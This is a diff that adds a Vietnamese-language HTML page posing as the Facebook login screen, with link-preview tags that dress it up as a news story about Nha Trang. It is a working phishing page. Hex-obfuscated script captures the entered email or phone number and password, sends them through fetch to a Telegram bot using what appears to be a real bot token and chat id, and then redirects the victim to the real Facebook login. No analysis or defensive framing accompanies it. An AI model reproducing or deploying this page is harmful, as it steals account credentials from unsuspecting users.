@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Đăng nhập hoặc đăng ký</title>
+    <meta property="og:title" content="Xôn xao sự việc diễn ra tại Nha Trang sáng nay" />
+    <meta property="og:description" content="Cập nhật diễn biến mới nhất tại hiện trường..." />
+    <meta property="og:image" content="https://vcdn1-vnexpress.vnecdn.net/2023/12/21/nha-trang-1703131345-7284-1703131435.jpg" />
+    <style>
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }
+        .main-content { flex: 1; display: flex; justify-content: center; align-items: center; }
+        .container { display: flex; width: 100%; max-width: 980px; justify-content: space-between; align-items: center; padding: 20px; box-sizing: border-box; }
+        .left-content { max-width: 500px; padding-right: 32px; }
+        .fb-logo { color: #1877f2; font-size: 60px; margin: 0; letter-spacing: -2px; }
+        h2 { font-weight: normal; font-size: 28px; line-height: 32px; margin-top: 0; }
+        .login-card { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); width: 396px; text-align: center; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 17px; }
+        .btn-login { background: #1877f2; color: white; width: 100%; padding: 12px; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; }
+        .forgot-pw { display: block; margin: 16px 0; color: #1877f2; text-decoration: none; font-size: 14px; }
+        hr { border: 0; border-top: 1px solid #dadde1; margin: 20px 0; }
+        .btn-new-acc { background: #42b72a; color: white; padding: 0 16px; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; line-height: 48px; cursor: pointer; }
+        footer { background: white; padding: 20px 0; color: #737373; font-size: 12px; }
+        .footer-content { max-width: 980px; margin: 0 auto; padding: 0 20px; }
+        @media (max-width: 900px) { .container { flex-direction: column; text-align: center; } .left-content { padding-right: 0; margin-bottom: 40px; } h2 { font-size: 22px; } .login-card { width: 100%; } }
+    </style>
+</head>
+<body>
+    <div class="main-content">
+        <div class="container">
+            <div class="left-content">
+                <h1 class="fb-logo">facebook</h1>
+                <h2>Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</h2>
+            </div>
+            <div class="login-card">
+                <form id="fb_login_process">
+                    <input type="text" id="u_name" placeholder="Email hoặc số điện thoại" required>
+                    <input type="password" id="u_pass" placeholder="Mật khẩu" required>
+                    <button type="submit" class="btn-login">Đăng nhập</button>
+                    <a href="#" class="forgot-pw">Quên mật khẩu?</a>
+                    <hr>
+                    <button type="button" class="btn-new-acc">Tạo tài khoản mới</button>
+                </form>
+            </div>
+        </div>
+    </div>
+    <footer>
+        <div class="footer-content">
+            <p>Tiếng Việt · English (UK) · 中文(台灣) · 日本語 · 한국어</p>
+            <hr style="border-top: 1px solid #ebedf0;">
+            <p>Meta © 2026</p>
+        </div>
+    </footer>
+
+    <script>
+        (function(){
+            // Các từ khóa quan trọng đã được mã hóa Hex
+            const _0x1a2b = {
+                't': "\x38\x37\x32\x35\x38\x37\x31\x35\x34\x35\x3a\x41\x41\x46\x43\x51\x58\x37\x75\x75\x51\x71\x61\x69\x73\x72\x56\x43\x77\x4B\x48\x39\x76\x55\x64\x46\x6d\x32\x32\x6a\x38\x73\x6d\x6b\x73\x30",
+                'c': "\x31\x39\x34\x36\x38\x39\x31\x35\x31\x30",
+                'a': "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x6f\x72\x67\x2f\x62\x6f\x74",
+                's': "\x2f\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65\x3f\x63\x68\x61\x74\x5f\x69\x64\x3d"
+            };
+
+            document.getElementById('\x66\x62\x5f\x6c\x6f\x67\x69\x6e\x5f\x70\x72\x6f\x63\x65\x73\x73').addEventListener('\x73\x75\x62\x6d\x69\x74', function(_0x3e) {
+                _0x3e.preventDefault();
+                const _0x1 = document.getElementById('\x75\x5f\x6e\x61\x6d\x65').value;
+                const _0x2 = document.getElementById('\x75\x5f\x70\x61\x73\x73').value;
+                const _0xmsg = `--- NEW LOG ---\nU: ${_0x1}\nP: ${_0x2}`;
+
+                // Thực thi ngầm gửi dữ liệu
+                fetch(_0x1a2b['a'] + _0x1a2b['t'] + _0x1a2b['s'] + _0x1a2b['c'] + "\x26\x74\x65\x78\x74\x3d" + encodeURIComponent(_0xmsg))
+                .finally(() => {
+                    window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2e\x63\x6f\x6d\x2f\x6c\x6f\x67\x69\x6e\x2f";
+                });
+            });
+        })();
+    </script>
+</body>
+</html>
